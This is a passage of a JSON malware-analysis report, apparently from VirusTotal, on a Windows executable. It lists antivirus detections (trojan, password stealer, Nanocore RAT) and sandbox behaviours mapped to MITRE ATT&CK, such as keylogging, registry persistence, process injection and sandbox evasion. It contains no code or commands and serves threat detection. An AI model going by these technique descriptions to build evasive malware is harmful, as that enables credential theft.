        "VBA32": {
          "category": "malicious",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": "TScope.Trojan.MSIL",
          "method": "blacklist",
          "engine_update": "20231027"
        },
        "Cylance": {
          "category": "malicious",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": "unsafe",
          "method": "blacklist",
          "engine_update": "20231004"
        },
        "Panda": {
          "category": "malicious",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": "Trj/Chgt.AD",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "TROJ_GEN.R002C0XJM23",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Malware.Win32.Gencirc.13f27c64",
          "method": "blacklist",
          "engine_update": "20231029"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "SentinelOne": {
          "category": "malicious",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.0.1",
          "result": "Static AI - Malicious PE",
          "method": "blacklist",
          "engine_update": "20231018"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Malware.74499699.susgen",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "MSIL/Kryptik.AJXD!tr",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231023"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "Win32:PWSX-gen [Trj]",
          "method": "blacklist",
          "engine_update": "20231028"
        },
        "Cybereason": {
          "category": "undetected",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231011"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "Win32:PWSX-gen [Trj]",
          "method": "blacklist",
          "engine_update": "20231028"
        }
      },
      "reputation": -2,
      "sigma_analysis_stats": {
        "high": 1,
        "medium": 3,
        "critical": 1,
        "low": 2
      }
    },
    "type": "file",
    "id": "dfb9b3c7cf15baa877da2d2c87e1e53761517094bab2de1a6b92ebca122fa858",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/dfb9b3c7cf15baa877da2d2c87e1e53761517094bab2de1a6b92ebca122fa858"
    }
  },
  "mitre": {
    "data": {
      "VMRay": {
        "tactics": [
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model (DCOM) and Windows Remote Management (WinRM). Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement.  ",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "(Process #2) dfb9b3c7cf15baa877da2d2c87e1e53761517094bab2de1a6b92ebca122fa858.exe tries to detect firewall via WMI query: \"SELECT DisplayName FROM FirewallProduct\"."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1047/",
                "id": "T1047",
                "name": "Windows Management Instrumentation"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
            "techniques": [
              {
                "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. In cloud-based environments, adversaries may also use cloud APIs, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. This functionality could also be built into remote access tools. \nThis technique may incorporate use of other techniques such as File and Directory Discovery and Lateral Tool Transfer to identify and move files, as well as Cloud Service Dashboard and Cloud Storage Object Discovery to identify resources in cloud environments.",
                "signatures": [
                  {
                    "severity": "HIGH",
                    "description": "(Process #2) dfb9b3c7cf15baa877da2d2c87e1e53761517094bab2de1a6b92ebca122fa858.exe queries foreground window and potentially exfiltrates data."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1119/",
                "id": "T1119",
                "name": "Automated Collection"
              },
              {
                "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
                "signatures": [
                  {
                    "severity": "HIGH",
                    "description": "(Process #2) dfb9b3c7cf15baa877da2d2c87e1e53761517094bab2de1a6b92ebca122fa858.exe reads the text contents of the foreground window by API (possible keylogging attempt)."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1056/",
                "id": "T1056",
                "name": "Input Capture"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0009/",
            "id": "TA0009",
            "name": "Collection"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "(Process #2) dfb9b3c7cf15baa877da2d2c87e1e53761517094bab2de1a6b92ebca122fa858.exe reads the cryptographic machine GUID from registry."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              },
              {
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "(Process #2) dfb9b3c7cf15baa877da2d2c87e1e53761517094bab2de1a6b92ebca122fa858.exe enumerates running processes."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1057/",
                "id": "T1057",
                "name": "Process Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "(Process #2) dfb9b3c7cf15baa877da2d2c87e1e53761517094bab2de1a6b92ebca122fa858.exe reads the text contents of the foreground window by API (possible keylogging attempt)."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1010/",
                "id": "T1010",
                "name": "Application Window Discovery"
              },
              {
                "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "(Process #2) dfb9b3c7cf15baa877da2d2c87e1e53761517094bab2de1a6b92ebca122fa858.exe reads the cryptographic machine GUID from registry."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1012/",
                "id": "T1012",
                "name": "Query Registry"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
            "techniques": [
              {
                "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
                "signatures": [
                  {
                    "severity": "HIGH",
                    "description": "(Process #2) dfb9b3c7cf15baa877da2d2c87e1e53761517094bab2de1a6b92ebca122fa858.exe reads the text contents of the foreground window by API (possible keylogging attempt)."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1056/",
                "id": "T1056",
                "name": "Input Capture"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0006/",
            "id": "TA0006",
            "name": "Credential Access"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "(Process #2) dfb9b3c7cf15baa877da2d2c87e1e53761517094bab2de1a6b92ebca122fa858.exe adds \"C:\\Program Files (x86)\\AGP Service\\agpsvc.exe\" to Windows startup via registry."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1112/",
                "id": "T1112",
                "name": "Modify Registry"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          }
        ]
      },
      "Zenbox": {
        "tactics": [
          {
            "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
            "techniques": [
              {
                "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates a DirectInput object (often for capturing keystrokes)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1056/",
                "id": "T1056",
                "name": "Input Capture"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0009/",
            "id": "TA0009",
            "name": "Collection"
          },
          {
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Uses schtasks.exe or at.exe to add and modify task schedules"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/",
                "id": "T1053",
                "name": "Scheduled Task/Job"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "id": "TA0003",
            "name": "Persistence"
          },
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Uses schtasks.exe or at.exe to add and modify task schedules"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/",
                "id": "T1053",
                "name": "Scheduled Task/Job"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads ini files"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              },
              {
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Queries a list of all running processes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1057/",
                "id": "T1057",
                "name": "Process Discovery"
              },
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Contains medium sleeps (>= 30s)"
                  },
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  },
                  {
                    "severity": "INFO",
                    "description": "Contains long sleeps (>= 3 min)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              },
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Queries the cryptographic machine GUID"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads software policies"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries the volume information (name, serial number etc) of a device"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1095/",
                "id": "T1095",
                "name": "Non-Application Layer Protocol"
              },
              {
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "C2 URLs / IPs found in malware configuration"
                  },
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/",
                "id": "T1071",
                "name": "Application Layer Protocol"
              },
              {
                "description": "An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as VNC, Team Viewer, AnyDesk, ScreenConnect, LogMein, AmmyyAdmin, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.\nRemote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.\nAdversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\nInstallation of many remote access software may also include persistence (e.g., the software's installation routine creates a Windows Service).",
                "signatures": [
                  {
                    "severity": "HIGH",
                    "description": "Detected Nanocore Rat"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1219/",
                "id": "T1219",
                "name": "Remote Access Software"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Injects a PE file into a foreign processes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              },
              {
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \nAdversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational may be modified to tamper with and potentially disable Sysmon logging. \nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates guard pages, often used to prevent reverse engineering and debugging"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1562/001/",
                "id": "T1562.001",
                "name": "Disable or Modify Tools"
              },
              {
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading. Masquerading may also include the use of Proxy or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates files inside the user directory"
                  },
                  {
                    "severity": "INFO",
                    "description": "Creates files inside the program directory"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1036/",
                "id": "T1036",
                "name": "Masquerading"
              },
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Contains medium sleeps (>= 30s)"
                  },
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  },
                  {
                    "severity": "INFO",
                    "description": "Contains long sleeps (>= 3 min)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              },
              {
                "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. \nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Binary may include packed or crypted data"
                  },
                  {
                    "severity": "INFO",
                    "description": "PE file has an executable .text section which is very likely to contain packed code (zlib compression ratio < 0.3)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/002/",
                "id": "T1027.002",
                "name": "Software Packing"
              },
              {
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Binary may include packed or crypted data"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/",
                "id": "T1027",
                "name": "Obfuscated Files or Information"
              },
              {
